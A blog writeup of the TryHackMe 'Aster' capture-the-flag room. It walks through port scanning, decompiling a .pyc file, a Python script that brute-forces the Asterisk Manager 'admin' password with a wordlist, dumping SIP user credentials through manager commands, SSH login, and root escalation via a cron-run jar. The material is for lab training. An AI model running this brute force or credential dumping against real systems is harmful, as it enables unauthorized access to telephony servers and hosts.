---
layout: default
---
# Aster Writeup

This is my writeup for the room [Aster](https://tryhackme.com/room/aster) in tryhackme. Hope it helps you :D

## Enumeration

First we'll start scanning ports with rustscan (or nmap).

```
PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fe:e3:52:06:50:93:2e:3f:7a:aa:fc:69:dd:cd:14:a2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDEs6oKJb5SNNUczex8j97pL/V93XRaRytbAH7iR9pN0HbCmc2bD/Rg4IUuDArz4USY1G5aN0r+C3fcBSlmLWaqk+uzbNZFriELMcJPKa7tP7zx7o4TVMQDepvvcZUy9Z8QoA+n4cJYOjlldkWGq/dmsPQqBHDmHowxMauJkZxh2QVR0WpDZxcjbS26O8aC62QvT5ct9wgzBzD/dVV/SC3VH7sQOPsEFj+PHGoHrFz7MntxtRyR9Ujf+Dzbk2wnUVGrc6NZt8MV3vfo5nXjBRPTaIX6XNTijQxoj0/0NJ3YwntmHOQXaPu4++fzjP9cf4+r8PNppeKNYwWLRxzjnAiZ
|   256 9c:4d:fd:a4:4e:18:ca:e2:c0:01:84:8c:d2:7a:51:f2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPROPGV3YntCB4YEBuSk7u8qF0H9WxI9nTGbCJahJP4gJNcEj4uwn24Ep1eSs0kHxjFdri6+QQlPUygwRvAQqTs=
|   256 c5:93:a6:0c:01:8a:68:63:d7:84:16:dc:2c:0a:96:1d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPrB46mC2C71WGXfIc9TwwLWhC99D9M2IxUHbQCbH0vp
80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Aster CTF
1720/tcp open  h323q931?   syn-ack
2000/tcp open  cisco-sccp? syn-ack
5038/tcp open  asterisk    syn-ack Asterisk Call Manager 5.0.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Okay, we can see that there are some ports open, let's take a look at port 80 and then we go back to the rest.

## Web Page

In port 80 there's a web server running, going to the site there's a .pyc file that we can download.

If you don't know, a .pyc file is python code compiled, so we need to reverse engineer it. I searched on the web how to reverse engineer a .pyc file and I found [this tool](https://pypi.org/project/uncompyle6/).

So let's download the file and use uncompyle6 to decompile it.

{% highlight python %}
# uncompyle6 version 3.7.1
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.6.9 (default, Jul 17 2020, 12:50:27) 
# [GCC 8.4.0]
# Embedded file name: ./output.py
# Compiled at: 2020-08-11 03:59:35
import pyfiglet
o0OO00 = pyfiglet.figlet_format('Hello!!')
oO00oOo = '476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e'
OOOo0 = bytes.fromhex(oO00oOo)
Oooo000o = OOOo0.decode('ASCII')
if 0:
    i1 * ii1IiI1i % OOooOOo / I11i / o0O / IiiIII111iI
Oo = '476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21'
I1Ii11I1Ii1i = bytes.fromhex(Oo)
Ooo = I1Ii11I1Ii1i.decode('ASCII')
if 0:
    iii1I1I / O00oOoOoO0o0O.O0oo0OO0 + Oo0ooO0oo0oO.I1i1iI1i - II
print o0OO00
# okay decompiling output.pyc
{% endhighlight %}

As we can see, there's nothing dangerous in this script so we can run it in our machine with no worries, if we run it, this is the output:

```
 _   _      _ _       _ _ 
| | | | ___| | | ___ | | |
| |_| |/ _ \ | |/ _ \| | |
|  _  |  __/ | | (_) |_|_|
|_| |_|\___|_|_|\___/(_|_)
                          

```

Okay, let's change the script a bit to output this decoded text:

{% highlight python %}
oO00oOo = '476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e'
OOOo0 = bytes.fromhex(oO00oOo)
Oooo000o = OOOo0.decode('ASCII')
print(Oooo000o);
Oo = '476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21'
I1Ii11I1Ii1i = bytes.fromhex(Oo)
Ooo = I1Ii11I1Ii1i.decode('ASCII')
print(Ooo)
{% endhighlight %}

Now the output is this:

```
Good job, user "admin" the open source framework for building communications, installed in the server.
Good job reverser, python is very cool!Good job reverser, python is very cool!Good job reverser, python is very cool!
```

## Asterisk Call Manager

The output is saying something about an open source framework in the machine, if we go back to the ports we found on our scan there's a service called Asterisk Call Manager 5.0.2, running on port 5038, let's connect to it using netcat and send a newline to see how it responds.


```
Asterisk Call Manager/5.0.2

Response: Error
Message: Missing action in request
```

The service responds to payloads we send, I searched on the web how this service works and I ended up finding [this page](https://www.voip-info.org/asterisk-manager-example-login/), sending the payload found in this page the service responds saying that the authentication failed and closes the connection.

The output of the python code earlier told us about the user admin, so I thought that we would need to find the default credentials for asterisk manager, I searched a lot with no luck.

After spending some time searching for default credentials, I thought of trying to brute force the user password, so I ended up writing this python script:

{% highlight python %}
import socket

host = "<DEPLOYED_MACHINE_IP>"

port = 5038

with open("rockyou.txt") as f:
    for line in f:
        passw = line.replace("\n","")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.recv(1024)

        string = "ACTION: LOGIN\nUSERNAME: admin\nSECRET: {}\nEVENTS: ON\n\n".format(passw)

        print(string)

        s.sendall(str.encode(string))

        result = s.recv(1024)

        print(result.decode("utf-8"))
        if(not "failed" in result.decode("utf-8")):
            print(passw + " is the password")
            break

        s.close()


{% endhighlight %}

This script loops through rockyou.txt starting a connection to the service sending a login attempt and closing the connection until finding an accepted connection, so I let this service running while trying to investigate the machine a little more and, after less than one minute, the script found the password.

So after getting the password I logged on the service using the credentials we have. After logging in the service, it responds with this:

```
Response: Success
Message: Authentication accepted

Event: FullyBooted
Privilege: system,all
Uptime: 1015
LastReload: 1015
Status: Fully Booted

```

So I searched which actions I could use in this service and there are a LOT of possible actions, but one of them caught my eye, the action **command**.

So the first thing I tried was this:

```
action: command
command: ls

Response: Error
Message: Command output follows
Output: No such command 'ls' (type 'core show help ls' for other possible commands)
```

I thought that I could maybe use this action to execute commands on the machine, but after searching for a bit it seems that it is not possible, but I still wanted to see what I could do with this command action and the output tells us to type **'core show help &#x3C;COMMAND&#x3E;'**, so I tried sending the command **'core show help'** and got a huge list of possible commands.

So I read the list and started trying some of the commands that I thought could be useful and the command that ended up giving me what I wanted was **'sip show users'** here's the output of it.

```
action: command
command: sip show users

Response: Success
Message: Command output follows
Output: Username                   Secret           Accountcode      Def.Context      ACL  Forcerport
Output: 100                        100                               test             No   No        
Output: 101                        101                               test             No   No        
Output: [REDACTED]                 [REDACTED]                        test             No   No 
```

Interesting, now we have an username and a password, the first thing that came to my mind was trying to ssh on to the machine using these creds. It worked.

## Inside the machine

Now we are inside the machine, if we use ls we can find the user flag and another file called **Example_Root.jar**.

So I downloaded the file to my machine to reverse engineer it.

First we need to extract the .class file from the jar, and we can do that by extracting it just like we would extract any .zip files. I used the command `unzip Example_Root.jar` and got the .class file, then I opened ghidra and used it to reverse engineer the file.

{% highlight java %}
/* Flags:
     ACC_PUBLIC
     ACC_STATIC
   
   public static void main(java.lang.String[])  */

void main_java.lang.String[]_void(String[] param1)

{
  PrintStream objectRef;
  boolean bVar1;
  FileWriter objectRef_00;
  File objectRef_01;
  
  objectRef_01 = new File("/tmp/flag.dat");
  bVar1 = Example_Root.isFileExists(objectRef_01);
  if (bVar1 != false) {
    objectRef_00 = new FileWriter("/home/harry/root.txt");
    objectRef_00.write("my secret <3 baby");
    objectRef_00.close();
    objectRef = System.out;
    objectRef.println("Successfully wrote to the file.");
  }
  return;
}
{% endhighlight %}

The code checks if a there's a file named **flag.dat** in **/tmp** and if it has, it writes something in **/home/harry/root.txt**. So after checking out what it did I went back in the deployed machine, created a file **/tmp/flag.dat** and started searching it for a way of executing the code in **Example_Root.jar** as root.

First I checked sudo -l and I couldn't execute anything, then I searched for SUID files and I couldn't find anything interesting and then I searched **/etc/crontab** and it had something interesting.

```
harry@ubuntu:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
*  *    * * *   root    cd /opt/ && bash ufw.sh
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /root/java/ && bash run.sh
```

There's a cron job executing a shellscript in **/root/java/run.sh** I tried to read that script but I couldn't, but I imagined it executed the code in **Example_Root.jar**, so since I already had created the file **/tmp/flag.dat** I just listed the files in /home/harry and there I found root.txt.

```
harry@ubuntu:~$ ls
Example_Root.jar  root.txt  user.txt
```

Hope you liked the writeup, the room is really nice, check out the creator [stuxnet](https://tryhackme.com/p/stuxnet) , they have some other really nice rooms on tryhackme :D.